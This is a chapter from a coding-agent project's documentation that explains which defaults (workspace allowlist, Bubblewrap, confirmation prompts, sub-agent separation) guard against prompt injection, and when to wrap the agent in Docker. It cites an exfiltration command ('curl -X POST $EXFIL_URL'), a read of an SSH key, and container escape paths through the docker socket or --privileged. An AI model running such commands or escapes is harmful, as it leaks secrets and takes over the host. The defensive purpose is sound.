# Security revisited: the coding-agent shape

[The security chapter](https://codeberg.org/mvysny/pikuri/src/branch/master/book/security.md) gave you the kit (trifecta, the
table, the decision procedure). [The coding-agent chapter](code.md) just
showed three of those kit slots concretely — `Workspace` is the
"blast-radius containment" row, `Confirmer` is the "human gate"
row, `Sandbox::Bubblewrap` joins containment for the bash
subprocess. This chapter is the closing accounting: with those
mechanisms now in front of you, **what does `pikuri-code`'s
default configuration actually protect, and what doesn't it?**
Then the deepest layer — wrapping the **whole pikuri process** in
a container, when in-process defenses aren't enough.

There's no new code to run. This is where the kit from the security chapter
gets compared, side by side, against the specific shape from
the coding-agent chapter.

## What `pikuri-code`'s defaults protect

`pikuri-code` is a working demo of the coding-agent shape; it is
**not** a hardened tool, and the threat model has clear gaps.
This chapter's view — what its defaults do and don't cover,
mapped onto the kit slots from the security chapter.

What the default configuration *does* protect:

- **Workspace allowlist** for the file tools. The LLM cannot
  `read` your `~/.ssh/`, `edit` your `~/.aws/credentials`, or
  `glob` outside the project + read-only toolchain paths;
  `..`-escapes and out-of-bounds symlinks are rejected. (Kit
  slot: blast-radius containment, file side.)
- **Bubblewrap filesystem isolation** for the `bash` subprocess.
  A `bash`-issued `cat ~/.ssh/id_ed25519` returns "No such file
  or directory" because `~/.ssh` isn't bound into the sandbox;
  toolchain caches appear only as content-only overlays whose
  writes vanish at process exit. (Kit slot: blast-radius
  containment, shell side.)
- **Confirmer prompts** for every `write` and every `bash` — you
  see the proposed content / command before it runs. (Kit slot:
  human gate.)
- **Privilege-separated sub-agents.** `FILE_MINER`, `RESEARCHER`,
  and `GIT_REPO_RESEARCHER` run in a child whose `tool_names`
  rule out `bash` / `write` / `edit` / `agent` recursion, so a
  child that reads a prompt-injected file has no tool to act on
  it — only its one-paragraph reply reaches the parent. (Kit
  slot: break the trifecta, applied to the sub-agent boundary.
  The security chapter's "honest gap" — the relay leg — is in full force
  here: the parent still holds all three legs.)

What it *doesn't* protect:

- **Network egress.** `bash` has `--share-net` so `git`, `curl`,
  and `mvn` work — which means a `curl -X POST $EXFIL_URL` on
  context already loaded is one approved command away. The
  `bash` confirmation prompt is your check on the parent: read
  what's about to run before you say yes. (Kit slot: egress
  allowlist — not shipped in-process yet; the workaround is
  network-layer enforcement around the outer container, below.)
- **In-project mutation.** The agent can `edit` / `write`
  anything under the project root — `Gemfile`, the test suite,
  the build files. The allowlist stops it reaching *out* of the
  project, not *into* it. ("Leak *this* project's `.env`" still
  works, just like the kit table predicts.)
- **`--yolo` mode.** Disables the sandbox, auto-approves every
  confirmation, and swaps the workspace to `AllowAll` (credential
  denylist only). It's for use *inside* a container or VM; running
  it on your laptop hands the model a shell with your permissions.
- **No audit log.** Once you approve a `bash` command it runs;
  the only record is your scrollback plus whatever the tools
  persist (shell history, git reflog).
- **The injection chain itself.** A page `web_scrape` fetches, or
  a file `read` loads, can carry instructions the model acts on;
  persona separation and the confirmation prompts shrink the
  blast radius but don't close the vector. The security chapter's five
  attacks walk this end to end — attack 5 is the worst case for
  this binary specifically.

In short: **assume the agent can do anything your user can do
through `bash` with network access**, and approve each prompt on
that basis. For adversarial isolation, the next section is the
outer wall.

## Wrapping pikuri in Docker

Bubblewrap (the coding-agent chapter) and Docker (the MCP-revisited chapter) are both isolation
mechanisms, but each protects only one thing. Bubblewrap wraps a
single `bash` invocation; Docker wraps a single MCP server. The
rest of pikuri's process — the file tools, the LLM transport, the
MCP client side, the agent loop itself — runs with your usual
shell's permissions. That's the right default for the recommended
path (the first-conversation chapter: your machine, your project), and it's why pikuri
ships with no outer container.

If you want to step outside that path — unattended runs, or
pointing pikuri at code you don't trust — the next move up is
wrapping the **whole pikuri process** in a container. This is the
outer-isolation row of the kit table, made concrete.

### What it adds on top of Bubblewrap

Bubblewrap stops `bash` from reading `~/.ssh`. It does not stop a
parser bug in Nokogiri or Faraday from doing something unexpected
in pikuri's own process, or a hostile MCP server from reading your
home directory. The Workspace seam blocks the *named* file-tool
path (the coding-agent chapter), but it lives in the same process; a
path-traversal bug, or an MCP that does raw filesystem access,
routes around it.

A Docker wrapper around the whole pikuri process closes those
gaps:

- **A bug in pikuri itself is bounded.** A hypothetical
  path-escape in the Workspace seam, a parser hitting a malformed
  input — the outer container still holds.
- **Egress becomes shapeable a layer down.** The kit table noted
  that an in-process egress allowlist isn't shipped yet; Docker
  gives you one today. Drop the container's network, or attach it
  to a bridge that allows only your registries and the LLM
  endpoint, and the "data out" leg closes for everything inside.
- **Recovery is throwing the container away.** A coding agent that
  goes catastrophically off the rails inside `--rm` costs you the
  workspace mount and nothing else. Tighten further with mount
  discipline — a read-only mount, or a snapshot/copy of the
  project — and even routine edits become reviewable: the agent
  edits its view, you decide whether the diff propagates.
- **A defense-in-depth backstop for host secrets (secondary).**
  The Workspace seam already keeps file tools out of `~/.ssh`,
  `~/.aws`, `~/.gnupg`, and other projects; Bubblewrap keeps
  `bash` out; the MCP-revisited chapter recommends containerising MCPs to keep
  them out too. The outer container makes "not in scope" a
  property of the filesystem view rather than of well-behaved
  code — useful if any of those has a bug, a misconfiguration
  (you forgot to containerise an MCP), or a library exploit.
  Rare paths, not the headline reason to reach for outer Docker.

### Why Docker-in-Docker is the wrong inner step

The MCP-revisited chapter's "every MCP in a container" stance is written for the
native-pikuri shape: pikuri trusted, MCPs not, container as the
boundary between them. Once pikuri itself is in a container, the
boundary moves up — and reaching for *another* container layer
inside means Docker-in-Docker. There are two ways to do that, and
both collapse the outer wall:

- **Bind-mount the docker socket** from the host into the
  outer container. A rootful docker daemon runs as root, and
  anything that can talk to its socket can ask it to start a
  *sibling* container with `-v /:/host` mounted in. Drop a key
  into `/host/root/.ssh/authorized_keys` from that sibling and
  the agent has root on your host — not a sandbox escape, the
  daemon was a root-equivalent API the whole time. (The prerequisites chapter's
  rootless daemon softens "root" to "your user" — the sibling
  can't touch `/root`, but `~/.ssh/authorized_keys` and every
  file you own are still in reach, which is the whole exposure
  the outer container existed to prevent. The verdict stands.)
- **Run the daemon inside the outer container** with
  `--privileged`. That flag grants all Linux capabilities,
  disables seccomp/AppArmor, and exposes host `/dev`. The agent
  can `mount /dev/sda1 /h` and rewrite host files directly. Same
  outcome: root on your host.

Both are well-rehearsed escape paths. Treat either of them as
"the agent now runs as root on your machine."

So: **when pikuri itself is in a container, MCPs run alongside it
in the same container, not in nested ones.** The outer Docker is
the MCP sandbox. Drop the `docker run -i --rm …` wrappers from
the MCP-revisited chapter's registry recipes and invoke the MCP binaries directly
inside the container — `npx -y mcp-maven-deps@<pin>`, `python -m
mcp_server_fetch`, and so on — with packages pinned in the outer
image's Dockerfile the same way the MCP-revisited chapter pinned them one layer
in. Vendor-only images (the GitHub MCP example from the MCP-revisited chapter)
don't compose cleanly with this shape; you'd need to extract the
binary into your outer image or pass on that MCP.

### What still bites inside the outer container

The container is a wall around the process, not around what the
process does with what's mounted in:

- **The project itself is reachable.** You mounted it in so the
  agent could edit it; an injection in the project's own files
  can still "leak *this* project's `.env`" through whatever egress
  remains. Outer isolation bounds your *machine's* exposure, not
  this project's.
- **Tokens keep their blast radius.** A GitHub PAT passed in via
  `-e` does its full job from inside any container; the MCP-revisited chapter's
  "scope the token tightly" applies unchanged.
- **Bubblewrap inside is mostly redundant.** The outer container
  already isolates `bash`; running Bubblewrap inside adds little.
  `Sandbox::NONE` becomes the reasonable default when an outer
  container is doing the work.

### What it costs you

The wall comes with a maintenance bill: every dev tool the agent
reaches for has to exist inside the container, not just on your
host. That's a longer list than it looks.

- **A language runtime per MCP shape.** Node for npx-based MCPs,
  Python for pip-based ones, plus per-MCP system deps. The
  Playwright MCP is the costliest single case in the MCP-revisited chapter even
  when it lives in its own container — chromium, X11 socket
  discipline, screenshot paths — and an outer-container shape
  drags all of that into the *same* container as pikuri.
- **Your project's toolchain.** Whatever `bash` invokes to build
  your project — gcc, cargo, gradle, maven, the JDK, npm, ruby —
  needs to be installed and version-aligned with your host. A
  coding agent that can't run your build is barely one.
- **LSPs, if you rely on them.** Language servers run inside,
  not on your host — see [language intelligence](lsp.md) for what
  one costs to wire up in the first place.
- **Caches and UID/GID.** Bind-mount `~/.gradle`, `~/.m2`,
  `~/.cargo`, `~/.npm` and you share host caches with the agent's
  runtime (mild trust delegation, inert content); leave them out
  and every fresh container repays the download. Bind-mounted
  files arrive with host ownership, so the container's user must
  match or every `Edit` produces files the host can't modify.
- **Image maintenance.** Each pinned version is a thing that
  drifts. Upgrades happen inside the Dockerfile, by you, not via
  `apt upgrade` on your host.

None of these are individually hard. Stacked, they're a parallel
dev environment to maintain — which is the operational reason
the first-conversation chapter's recommended path stays container-free. The cost folds
into a normal workflow only when you *already* live inside the
container: your editor opens projects there, your shell is the
container's shell. If your hands-on development happens on the
host, the container is a duplicate to keep in sync, and version
skew between the two is a steady tax.

For the recommended-path use case from the first-conversation chapter, outer Docker is
overkill — the in-process defenses are designed for that path, and
pikuri primarily optimizes for *not* running fully inside Docker.
This section is for the cases where you've deliberately stepped
out of it.

## What's next

[Measuring the trifecta](https://codeberg.org/mvysny/pikuri/src/branch/master/book/trifecta-detector.md) closes the security
arc by turning it into a check you can run. Everything so far has
been you counting legs by hand; that chapter is the machine doing
it over your actual wiring at boot — and it's where the map every
binary has been printing since the first chapter finally gets
explained. It also settles the question this chapter leaves
hanging: `pikuri-code` over a private repo is the *one* loud
verdict in the repo, and the two declarations that move it.

Then [MCPs revisited](mcp-revisited.md) picks the MCP
thread back up at the harder end of the spectrum: the official
GitHub MCP server in Docker, npx and pip packages of unknown
provenance, Playwright with its open-web surface, and the full
threat-model section for `pikuri-mcp` — what the verifier
catches, what it doesn't, and where containerisation is doing
the real load-bearing work.
